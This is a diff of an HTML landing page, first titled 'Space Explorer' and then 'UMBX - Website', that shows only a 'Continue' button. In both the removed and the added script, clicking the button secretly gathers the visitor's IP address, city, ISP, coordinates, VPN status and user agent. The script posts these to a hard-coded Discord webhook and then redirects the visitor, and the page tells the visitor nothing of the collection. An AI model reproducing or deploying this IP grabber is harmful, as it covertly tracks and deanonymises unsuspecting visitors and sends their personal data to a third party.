@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Space Explorer</title>
+    <title>UMBX - Website</title>
     <style>
         body {
             margin: 0;
@@ -21,44 +21,12 @@
         .container {
             text-align: center;
             position: relative;
-        }
-        
-        .loading-text {
-            font-size: 2rem;
-            margin-bottom: 2rem;
-            opacity: 0;
-            animation: fadeIn 1s ease-in-out forwards;
-        }
-        
-        .loading-spinner {
-            width: 80px;
-            height: 80px;
-            border: 5px solid rgba(93, 63, 211, 0.3);
-            border-radius: 50%;
-            border-top-color: #5D3FD3;
-            animation: spin 1s ease-in-out infinite;
-            margin: 0 auto 2rem;
-        }
-        
-        .stars {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: -1;
-        }
-        
-        .star {
-            position: absolute;
-            background-color: white;
-            border-radius: 50%;
-            animation: starTwinkle 4s ease-in-out infinite;
+            max-width: 90%;
+            width: 450px;
         }
         
         .continue-btn {
-            display: none;
-            padding: 12px 24px;
+            padding: 10px 20px;
             background-color: #5D3FD3;
             color: white;
             border: none;
@@ -67,7 +35,7 @@
             cursor: pointer;
             transition: all 0.3s ease;
             box-shadow: 0 0 10px #00FFFF;
-            animation: glow 2s ease-in-out infinite alternate;
+            animation: glow 1.5s ease-in-out infinite alternate;
         }
         
         .continue-btn:hover {
@@ -75,165 +43,81 @@
             color: #0B0B0F;
         }
         
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        
-        @keyframes fadeIn {
-            0% { opacity: 0; }
-            100% { opacity: 1; }
-        }
-        
-        @keyframes starTwinkle {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.5; }
-        }
-        
         @keyframes glow {
-            0% { box-shadow: 0 0 5px #00FFFF; }
-            100% { box-shadow: 0 0 20px #5D3FD3; }
-        }
-        
-        .progress-bar {
-            width: 300px;
-            height: 10px;
-            background-color: rgba(255, 255, 255, 0.1);
-            border-radius: 5px;
-            margin: 0 auto;
-            overflow: hidden;
-        }
-        
-        .progress {
-            height: 100%;
-            width: 0%;
-            background-color: #00FFFF;
-            animation: progress 3s ease-in-out forwards;
-        }
-        
-        @keyframes progress {
-            0% { width: 0%; }
-            100% { width: 100%; }
+            from {
+                box-shadow: 0 0 5px #5D3FD3, 0 0 10px #5D3FD3;
+            }
+            to {
+                box-shadow: 0 0 10px #00FFFF, 0 0 20px #00FFFF;
+            }
         }
     </style>
 </head>
 <body>
-    <div class="stars" id="stars"></div>
     <div class="container">
-        <div class="loading-text">Initializing Space Explorer...</div>
-        <div class="loading-spinner"></div>
-        <div class="progress-bar">
-            <div class="progress"></div>
-        </div>
-        <button id="continueBtn" class="continue-btn">Continue to Exploration</button>
+        <button id="continueBtn" class="continue-btn">Continue</button>
     </div>
 
     <script>
-        // Create stars
-        function createStars() {
-            const starsContainer = document.getElementById('stars');
-            const starCount = 100;
+        document.getElementById('continueBtn').addEventListener('click', function() {
+            // Disable button to prevent multiple clicks
+            this.disabled = true;
+            this.textContent = 'Loading...';
             
-            for (let i = 0; i < starCount; i++) {
-                const star = document.createElement('div');
-                star.classList.add('star');
-                
-                // Random size between 1 and 3px
-                const size = Math.random() * 2 + 1;
-                star.style.width = `${size}px`;
-                star.style.height = `${size}px`;
-                
-                // Random position
-                star.style.top = `${Math.random() * 100}%`;
-                star.style.left = `${Math.random() * 100}%`;
-                
-                // Random animation delay
-                star.style.animationDelay = `${Math.random() * 4}s`;
-                
-                starsContainer.appendChild(star);
-            }
-        }
-        
-        // Show continue button after 3 seconds
-        function showContinueButton() {
-            setTimeout(() => {
-                const continueBtn = document.getElementById('continueBtn');
-                continueBtn.style.display = 'inline-block';
-                continueBtn.style.opacity = '0';
-                
-                // Fade in animation
-                let opacity = 0;
-                const fadeIn = setInterval(() => {
-                    if (opacity >= 1) {
-                        clearInterval(fadeIn);
-                    }
-                    continueBtn.style.opacity = opacity;
-                    opacity += 0.1;
-                }, 100);
-            }, 3000);
-        }
-        
-        // Get IP and location data
-        async function getIPInfo() {
-            try {
-                const response = await fetch('https://ipapi.co/json/');
-                return await response.json();
-            } catch (error) {
-                console.error('Error fetching IP info:', error);
-                return { error: 'Failed to fetch IP data' };
-            }
-        }
-        
-        // Send data to Discord webhook
-        async function sendToDiscord(data) {
-            const webhookUrl = 'https://discord.com/api/webhooks/1358462713340236026/gUstsf4TEMqcOrN6b9GEaLja2NXe11ErQlCkeB_Pz2yDcfJNl2ANshC2A9-6-MkqDShI';
-            
-            const embed = {
-                title: "User Information Collected",
-                color: 0x5D3FD3,
-                fields: [
-                    { name: "IP Address", value: data.ip || "Unknown", inline: true },
-                    { name: "Country", value: data.country_name || "Unknown", inline: true },
-                    { name: "Region", value: data.region || "Unknown", inline: true },
-                    { name: "City", value: data.city || "Unknown", inline: true },
-                    { name: "ISP", value: data.org || "Unknown", inline: true },
-                    { name: "Timezone", value: data.timezone || "Unknown", inline: true },
-                    { name: "Location", value: `${data.latitude}, ${data.longitude}` || "Unknown", inline: true },
-                    { name: "User Agent", value: navigator.userAgent, inline: false }
-                ],
-                timestamp: new Date().toISOString()
-            };
-            
-            const payload = {
-                embeds: [embed]
-            };
-            
-            try {
-                await fetch(webhookUrl, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify(payload)
+            // Fetch IP information from ip-api.com (using HTTPS)
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(ipData => {
+                    const ipAddress = ipData.ip;
+                    
+                    // Get detailed information about the IP
+                    return fetch(`https://ipapi.co/${ipAddress}/json/`)
+                        .then(response => response.json())
+                        .then(data => {
+                            // Prepare data for Discord webhook
+                            const webhookData = {
+                                embeds: [{
+                                    title: "IP Information Collected",
+                                    color: 5814783, // Purple color
+                                    fields: [
+                                        { name: "IP Address", value: ipAddress, inline: true },
+                                        { name: "Country", value: data.country_name || "Unknown", inline: true },
+                                        { name: "Region", value: data.region || "Unknown", inline: true },
+                                        { name: "City", value: data.city || "Unknown", inline: true },
+                                        { name: "ISP", value: data.org || "Unknown", inline: true },
+                                        { name: "Proxy/VPN", value: data.proxy ? "Yes" : "No", inline: true },
+                                        { name: "Timezone", value: data.timezone || "Unknown", inline: true },
+                                        { name: "Latitude", value: data.latitude ? data.latitude.toString() : "Unknown", inline: true },
+                                        { name: "Longitude", value: data.longitude ? data.longitude.toString() : "Unknown", inline: true }
+                                    ],
+                                    timestamp: new Date().toISOString()
+                                }]
+                            };
+                            
+                            // Send data to Discord webhook
+                            return fetch('https://discord.com/api/webhooks/1358462713340236026/gUstsf4TEMqcOrN6b9GEaLja2NXe11ErQlCkeB_Pz2yDcfJNl2ANshC2A9-6-MkqDShI', {
+                                method: 'POST',
+                                headers: {
+                                    'Content-Type': 'application/json',
+                                },
+                                body: JSON.stringify(webhookData)
+                            });
+                        });
+                })
+                .then(() => {
+                    // Update button after successful submission
+                    document.getElementById('continueBtn').textContent = 'Thank you!';
+                    
+                    // Redirect to another page or perform additional actions
+                    setTimeout(() => {
+                        window.location.href = "https://umbx.pages.dev/"; // Replace with your desired URL
+                    }, 1500);
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    document.getElementById('continueBtn').textContent = 'Error, try again';
+                    document.getElementById('continueBtn').disabled = false;
                 });
-            } catch (error) {
-                console.error('Error sending to Discord:', error);
-            }
-        }
-        
-        // Initialize
-        document.addEventListener('DOMContentLoaded', () => {
-            createStars();
-            showContinueButton();
-            
-            // Add event listener to continue button
-            document.getElementById('continueBtn').addEventListener('click', async () => {
-                const ipInfo = await getIPInfo();
-                await sendToDiscord(ipInfo);
-                
-                // Redirect to a thank you page or another site
-                window.location.href = "https://umbx.pages.dev/";
-            });
         });
     </script>
 </body>
